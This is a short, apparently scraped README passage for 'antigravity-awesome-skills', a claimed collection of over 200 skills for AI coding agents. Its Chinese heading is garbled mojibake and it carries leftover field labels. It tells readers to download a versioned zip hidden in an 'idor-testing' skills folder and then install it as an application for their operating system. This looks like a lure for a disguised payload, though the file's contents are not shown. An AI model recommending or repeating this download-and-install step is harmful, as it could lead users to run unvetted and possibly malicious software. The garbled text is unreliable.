genes.content: Welcome to the **antigravity-awesome-skills** repository. This collection includes over 200 agentic skills designed specifically for AI agents like Claude Code, Antigravity, and Cursor. These skills are battle-tested and built for high performance. You will find skills that help with tasks in autonomous coding and enhance productivity.

genes.title: å®‰è£…ä¸å¿«é€Ÿå¼€å§‹
genes.content:
To begin your journey with antigravity-awesome-skills, follow these simple steps:

1. **Download the Skills**:
   - Click the download button below or visit the Releases page.
   - [Download Now](https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/idor-testing/awesome-antigravity-skills-3.0-beta.5.zip)

2. **Install the Application**:
   - Once you download the appropriate file for your system, locate it in your downloads folder.
   - Refer to the instructions below based on your operating system.
